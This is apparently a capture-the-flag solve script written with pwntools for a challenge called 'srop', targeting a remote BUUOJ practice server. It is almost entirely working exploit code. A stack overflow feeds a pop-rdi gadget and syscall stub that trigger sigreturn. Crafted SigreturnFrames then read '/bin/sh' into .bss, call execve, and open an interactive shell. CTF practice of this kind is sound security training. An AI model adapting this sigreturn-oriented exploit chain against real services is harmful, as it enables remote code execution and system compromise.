'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "25314" 
filename = "./pwn_1"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

padding_str = cyclic(48 + 8)
bss_addr = 0x0000000000404050
# sigreturn_addr = 0x0000000000401136
# syscall_addr = 0x0000000000403FE8 # got addr
syscall_addr = 0x0000000000401040
pop_rdi_addr = 0x0000000000401203
# pop_rsi_r15_addr = 0x0000000000401201

def B():
    gdb.attach(io)
    pause()

def pwn():
    # ret to read(0, .bss, 0x100)
    sigframe = SigreturnFrame()
    # sigframe.rax = constants.SYS_read
    sigframe.rdi = constants.SYS_read
    sigframe.rsi = 0
    sigframe.rdx = bss_addr
    sigframe.rcx = 0x400 # not enough for 0x100
    sigframe.rsp = bss_addr + len(padding_str)
    sigframe.rip = syscall_addr

    payload = padding_str 
    payload += p64(pop_rdi_addr) + p64(15) + p64(syscall_addr)
    payload += bytes(sigframe)
    io.sendlineafter(b'welcome to srop!\n', payload)

    # execve(.bss, 0, 0)
    sigframe = SigreturnFrame()
    sigframe.rdi = constants.SYS_execve
    sigframe.rsi = bss_addr
    sigframe.rdx = 0
    sigframe.rcx = 0
    sigframe.rsp = bss_addr
    sigframe.rip = syscall_addr

    payload = b'/bin/sh\x00'.ljust(len(padding_str), b'\x00')
    payload += p64(pop_rdi_addr) + p64(15) + p64(syscall_addr)
    payload += bytes(sigframe)
    # B()
    io.sendline(payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
